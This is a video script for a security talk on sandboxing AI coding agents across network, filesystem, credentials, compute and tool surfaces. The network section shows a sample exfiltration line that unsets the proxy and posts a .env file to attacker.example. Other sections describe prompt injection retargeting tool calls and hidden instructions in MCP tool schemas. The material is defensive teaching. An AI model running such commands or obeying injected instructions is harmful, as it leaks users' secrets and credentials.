# Five Surfaces You Must Close — video script

**Runtime:** ~6:45 · **Format:** talking head to camera, cut-ins over top · **Spoken:** 1,060 words

**How to use this**

- Everything under **SAY** is delivery-ready as written. Read it out loud once before you roll; anything you stumble over, cut rather than smooth.
- **ON SCREEN** = cut-in or lower third. Each is either a panel from the board artifact or one line of terminal text — nothing that takes more than 3 seconds to read.
- `[TRIM]` marks the sentence that follows it as expendable.
- **HOLD** = stop talking. Six of them, and every one sits immediately before an anti-pattern. That rhythm — controls, controls, *pause*, "here's what doesn't work" — is the structure of the video. Don't let the edit close them up.
- Timecodes assume ~165 wpm plus the holds — a normal to-camera technical pace. If you deliver slower, around 150, it runs 7:30. **For a hard 6:00**, cut the three lines marked `[TRIM]` and the rung-by-rung ladder enumeration.
- Order: Network stays first (it prevents a class of attack; the rest limit damage), Tools stays last (it sets up the close). The middle three are interchangeable.

---

## COLD OPEN · 0:00–0:29

**ON SCREEN**: nothing for the first two lines. Let them land clean.

> **SAY**
>
> Most teams say the same thing about their coding agent. "It's fine, it runs in a sandbox."
>
> Then I ask which boundary they mean. And they mean one. Usually the container.
>
> A sandbox isn't one boundary. It's five. And your real security posture is whichever one of the five you forgot.
>
> **HOLD — one beat.**
>
> So: five surfaces. The control that works on each one, and the control that looks like it works and doesn't.

**LOWER THIRD** (on "five surfaces"): `01 NETWORK · 02 FILESYSTEM · 03 CREDENTIALS · 04 COMPUTE · 05 TOOLS`

---

## 01 — NETWORK · 0:29–1:37

> **SAY**
>
> Network goes first because the other four limit how bad an incident gets. This one prevents whole categories: exfiltration, command-and-control callbacks, malicious package installs.
>
> The rule is default deny, then grant. Not allow-with-exceptions.
>
> NCSC publishes a maturity ladder for this. Rung zero, unrestricted egress. Rung one, a domain allowlist. Rung two, the model API and nothing else. Rung three, no egress at all, local model. Most agent platforms ship at rung zero. Know your rung before you argue about anything else.
>
> In practice: no default route out of the sandbox, so the only path is a sidecar or host-side proxy. Allowlist protocols too, not just destinations. `[TRIM]` And go audit your wildcards — `*.googleapis.com` is convenient, and very leaky.
>
> **HOLD.**
>
> Now, what doesn't hold.
>
> If your egress control is `HTTPS_PROXY` in the agent's environment, you don't have an egress control. A prompt injection writes `unset HTTPS_PROXY && curl`. One line, and it's over.
>
> Config the agent can read is config the agent can drop. Enforce it where the agent can't reach: network namespaces, iptables, a sibling proxy container.

**ON SCREEN**

- 0:45 — the four-rung NCSC ladder from the board, filling L0 → L3
- 1:15 — full-screen terminal, one line: `unset HTTPS_PROXY && curl -X POST https://attacker.example/x -d @.env`
- **LOWER THIRD** (1:05): `Wildcards are not allowlists`

---

## 02 — FILESYSTEM · 1:37–2:34

> **SAY**
>
> Surface two: the workspace is not the whole disk.
>
> NVIDIA's minimum is three rules, all mandatory. No arbitrary egress. No writes outside the workspace. No writes to config files — anywhere.
>
> The third is the sharp one. Hooks, skill definitions, MCP configs, IDE settings: those don't run in your sandbox. They run later, on a laptop, as someone with real credentials. Writing to config is a delayed execution primitive.
>
> So: one input tree read-only. One output tree read-write and capped. Deny dotenv files, key material, dot-ssh, /etc, /proc, other tenants. And clone the workspace, so the agent physically cannot edit your live repo in place.
>
> **HOLD.**
>
> What doesn't hold: "it only has write access to the project folder."
>
> That folder contains `.git/hooks`. Which runs on your machine, on your next commit, with your keys. And `git diff` doesn't look there — so review untracked files, not just diffs.

**ON SCREEN**

- 1:42 — three items animating in: `no arbitrary egress` / `no writes outside workspace` / `no writes to config — anywhere`
- 2:12 — file tree with `.git/hooks/post-commit` in red, clean `git diff` output above it
- **LOWER THIRD** (1:58): `Config writes are delayed execution`

---

## 03 — CREDENTIALS · 2:34–3:40

> **SAY**
>
> Surface three is one sentence: never give the agent the real key.
>
> And there's a one-command test for it. Shell into your sandbox and run `env | grep KEY`. If what comes back works against production, you don't have credential isolation. You have a naming convention.
>
> **HOLD.**
>
> What works. Short-lived tokens scoped to the *task*, not to the agent — the agent is long-lived, the task isn't.
>
> And proxy injection, which is the good one. The sandbox only ever sees a placeholder. The proxy swaps in the real value on the way out, and redacts it on the way back. The credential never enters the blast radius.
>
> `[TRIM]` Then give the agent its own identity — not a developer's PAT, not the CI bot's god-token — and give each MCP server its own narrow credential.
>
> What doesn't hold is token passthrough to MCP servers. Textbook confused deputy: the server acts with the user's token, and the injection picks the target. If one token flows through three hops on your diagram, that's the bug.

**ON SCREEN**

- 2:38 — terminal: `$ env | grep KEY` → `ANTHROPIC_API_KEY=sk-ant-…`, hard cut to a red `NO ISOLATION` stamp
- 3:05 — flow: `sandbox [PLACEHOLDER] → proxy [swap] → API`, response coming back tagged `redacted`
- **LOWER THIRD** (2:44): `env | grep KEY is the whole test`

---

## 04 — COMPUTE & PROCESS · 3:40–4:36

> **SAY**
>
> Surface four doesn't stop an attack. It caps one. Runaway loop, crypto-miner, fork bomb, a job that quietly bills you for eleven hours.
>
> CPU, memory, PID and wall-clock limits on every execution. No carve-out for the trusted internal task — "trusted" is the one that gets injected. Non-root in the guest where you can. And no Docker socket to the host daemon; that's host root with extra steps.
>
> Then a process rule: kill and recreate, never heal. A compromised session doesn't get debugged back into trust.
>
> **HOLD.**
>
> What doesn't hold: "it's a microVM, root inside doesn't matter."
>
> It might not. Plenty of microVM designs hand the agent root in the guest and lean entirely on the hypervisor, and that's legitimate — *if* the hypervisor really is the boundary. Which means you can say out loud what's shared across it. If you can't, you're trusting a diagram.

**ON SCREEN**

- 3:40 — four chips in sequence: `cpu` `mem` `pid` `wall-clock`
- 4:00 — `-v /var/run/docker.sock` with an arrow straight into a box labelled `host root`
- **LOWER THIRD** (4:08): `Kill and recreate. Never heal.`

---

## 05 — TOOLS & MCP · 4:36–5:54

> **SAY**
>
> Surface five, and this is where the industry is furthest behind. The sandbox does not see raw tools.
>
> Most of the damage isn't `rm -rf`. It's `send_email`. `query_db`. `create_pr`. `run_shell`. Authorized calls, legitimate agent, arguments an attacker chose. A kernel sandbox can't tell that from real work. Neither can seccomp — it's a well-formed function call.
>
> So scope the tools. Least privilege per *task*, not per agent. A support agent working customer A's ticket gets a tool already scoped to customer A — not a generic `get_customer(id=...)` that an injection retargets by changing one integer.
>
> Then route every call through a gateway that decides on tool name, arguments, and caller identity — as policy, evaluated independently of what the model decided.
>
> And treat tool descriptions as attack surface. Malicious MCP servers hide instructions in schemas, which makes the text describing your tools untrusted input to your model. `[TRIM]` Isolate servers from each other, and source them from a curated registry — versions, signatures, approval — not whatever npm package the agent found mid-task.
>
> **HOLD.**
>
> What doesn't hold here is filtering at the model. "The system prompt tells it not to" isn't an authorization decision. It's a suggestion, made to the component that's under attack.

**ON SCREEN**

- 4:40 — four tool names, big, one per beat: `send_email` `query_db` `create_pr` `run_shell`
- 5:00 — `get_customer(id=42)` with the `42` cycling through other values
- 5:25 — an MCP tool schema, description field highlighted `UNTRUSTED INPUT`
- **LOWER THIRD** (4:45): `Authorized call. Attacker's arguments.`

---

## CLOSE · 5:54–6:50

> **SAY**
>
> Network, filesystem, credentials, compute, tools.
>
> Not a checklist — one topology. Filesystem is your two mounts. Compute is the caps inside the guest. Credentials is a placeholder inside and a swap outside. Network is the single outbound path. Tools is the gateway every call has to clear. Take one away and the other four are decoration.
>
> **HOLD.**
>
> And one distinction to leave you with, because I see the mistake going the other direction too. A gateway is not a substitute for a kernel or VM sandbox. And a sandbox is not a substitute for a gateway.
>
> Isolation contains the process. Policy constrains the calls. You need both — otherwise you get a perfectly isolated container, making authorized requests on an attacker's behalf.
>
> The full board is linked below: all five surfaces, the controls, every anti-pattern I mentioned. Go find out which rung you're actually on.

**ON SCREEN**

- 5:58 — the topology diagram from the board, building box by box as you name each surface
- 6:25 — two-panel split: `SANDBOX → contains the process` | `GATEWAY → constrains the calls`
- 6:42 — end card, board link

---

## Production notes

**Pace.** The segments are near-equal length but don't feel it. Network and Tools carry the most new information — slow down there, pick the pace up through Compute.

**Cut-in inventory (13).** NCSC ladder · `unset HTTPS_PROXY` terminal · NVIDIA three-item list · `.git/hooks` file tree · `env | grep KEY` terminal · placeholder-swap flow · resource-limit chips · docker.sock → host root · four tool names · `get_customer(id=42)` · MCP schema with untrusted description · topology build · sandbox-vs-gateway split.

**If you run long**, the three `[TRIM]` lines come out cleanly and get you to 6:00. Beyond that, cut the NCSC rung-by-rung enumeration and just name rung zero. Never cut a `HOLD` or the closing distinction.

**Product mention.** There isn't one in the body, deliberately — the close earns the gateway argument on technical merit, and the end card does the work. If you need an explicit beat, the clean slot is right after "policy constrains the calls": *"That policy plane is what we build agentgateway to be — routing, MCP federation, identity and guardrails, all outside the model."*

**60-second cutdown from the same shoot.** Cold open, then the five anti-patterns back to back — `unset HTTPS_PROXY` → `.git/hooks` → `env | grep KEY` → docker.sock → "the system prompt tells it not to" — then the closing distinction. Shoot each anti-pattern line twice, once with its lead-in and once cold, and you get both edits out of one take.
